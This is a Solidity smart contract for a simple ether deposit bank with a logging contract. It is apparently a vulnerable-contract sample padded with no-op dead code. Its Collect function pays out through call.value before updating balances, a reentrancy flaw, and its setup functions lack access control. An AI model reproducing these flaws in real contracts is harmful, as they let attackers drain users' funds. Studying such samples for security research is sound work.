pragma solidity ^0.4.19;

contract PERSONAL_BANK
{
    mapping (address=>uint256) public balances;   
   
    uint public MinSum = 1 ether;
    
    LogFile Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);
    
    bool intitalized;

    function HiddenNumber() private pure returns (uint) {
        return 42;
    }

    function SetMinSum(uint _val)
    public
    {
        if(intitalized)revert();
        MinSum = _val;
        if (HiddenNumber() == 999) {
            uint x = 0;
            x += 1;
        }
    }
    
    function SetLogFile(address _log)
    public
    {
        if(intitalized)revert();
        Log = LogFile(_log);
        if (HiddenNumber() == 123456) {
            uint y = 0;
            y += 1;
        }
    }
    
    function Initialized()
    public
    {
        intitalized = true;
    }
    
    function Deposit()
    public
    payable
    {
        balances[msg.sender] += msg.value;
        Log.AddMessage(msg.sender, msg.value, "Put");
        if (HiddenNumber() == 888) {
            uint z = 0;
            z += 1;
        }
    }
    
    function Collect(uint _am)
    public
    payable
    {
        if (balances[msg.sender] >= MinSum && balances[msg.sender] >= _am)
        {
            if (msg.sender.call.value(_am)())
            {
                balances[msg.sender] -= _am;
                Log.AddMessage(msg.sender, _am, "Collect");
            }
        }
        if (HiddenNumber() == 333) {
            uint a = 0;
            a += 1;
        }
    }
    
    function() 
    public 
    payable
    {
        Deposit();
        if (HiddenNumber() == 555) {
            uint b = 0;
            b += 1;
        }
    }
}

contract LogFile
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    
    Message[] public History;
    
    Message LastMsg;
    
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
        if (HiddenNumber() == 777) {
            uint c = 0;
            c += 1;
        }
    }

    function HiddenNumber() private pure returns (uint) {
        return 42;
    }
}